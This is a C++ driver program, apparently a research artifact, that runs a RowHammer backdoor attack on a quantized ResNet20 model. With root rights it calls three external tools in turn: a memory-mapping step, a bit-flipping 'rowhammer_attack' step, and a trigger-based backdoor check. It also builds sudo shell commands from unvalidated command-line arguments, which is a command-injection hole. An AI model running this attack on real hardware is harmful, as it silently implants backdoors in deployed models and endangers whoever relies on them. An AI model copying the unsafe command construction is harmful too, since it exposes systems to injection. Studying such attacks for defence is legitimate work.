#include <iostream>
#include <string>
#include <cstdlib>
#include <unistd.h>
#include <sys/wait.h>

void print_banner(const std::string& text) {
    std::cout << "\n" << std::string(60, '=') << std::endl;
    std::cout << " " << text << std::endl;
    std::cout << std::string(60, '=') << std::endl;
}

int execute_command(const std::string& cmd) {
    std::cout << "[+] Executing: " << cmd << std::endl;
    int result = system(cmd.c_str());
    return WEXITSTATUS(result);
}

int main(int argc, char* argv[]) {
    // Default configuration
    std::string attack_report = "resnet20_int8_device1/attack_report_int8.txt";
    std::string model_bin = "ResNet20_FL32.bin";
    std::string metadata = "device2_1G_metadata.json";
    std::string trigger_pattern = "resnet20_int8_device1/trigger_pattern.npy";
    int hammer_rounds = 200;
    
    // Parse command line arguments
    if (argc > 1) attack_report = argv[1];
    if (argc > 2) model_bin = argv[2];
    if (argc > 3) metadata = argv[3];
    if (argc > 4) hammer_rounds = atoi(argv[4]);
    
    print_banner("RowHammer Backdoor Attack");
    std::cout << "Configuration:" << std::endl;
    std::cout << "  Attack report: " << attack_report << std::endl;
    std::cout << "  Model file: " << model_bin << std::endl;
    std::cout << "  Metadata: " << metadata << std::endl;
    std::cout << "  Hammer rounds: " << hammer_rounds << std::endl;
    std::cout << "  Trigger pattern: " << trigger_pattern << std::endl;
    
    // Check if running as root
    if (geteuid() != 0) {
        std::cerr << "\n[-] This attack requires root privileges for memory access" << std::endl;
        std::cerr << "    Please run with sudo" << std::endl;
        return 1;
    }
    
    // Step 1: Memory mapping preparation (requires sudo for pagemap access)
    print_banner("Step 1: Memory Mapping Preparation");
    std::string cmd = "sudo ./targeted_map " + model_bin + " " + attack_report + " " + metadata;
    int result = execute_command(cmd);
    if (result != 0) {
        std::cerr << "[-] Memory mapping failed with code " << result << std::endl;
        return 1;
    }
    
    // Step 2: Execute RowHammer attack with pattern records (requires sudo for pagemap access)
    print_banner("Step 2: RowHammer Attack with Pattern Records");
    std::string patterns_file = "patterns.json";  // Pattern records for each DRAM page
    cmd = "sudo ./rowhammer_attack " + attack_report + " " + model_bin + " " + patterns_file + " " + std::to_string(hammer_rounds);
    result = execute_command(cmd);
    if (result != 0) {
        std::cerr << "[-] RowHammer attack failed with code " << result << std::endl;
        return 1;
    }
    
    // Step 3: Test backdoor functionality
    print_banner("Step 3: Backdoor Verification");
    cmd = "./backdoor_test " + model_bin + " " + trigger_pattern;
    result = execute_command(cmd);
    if (result != 0) {
        std::cerr << "[-] Backdoor test failed with code " << result << std::endl;
        return 1;
    }
    
    print_banner("Attack Complete");
    std::cout << "All attack steps completed successfully." << std::endl;
    
    return 0;
}
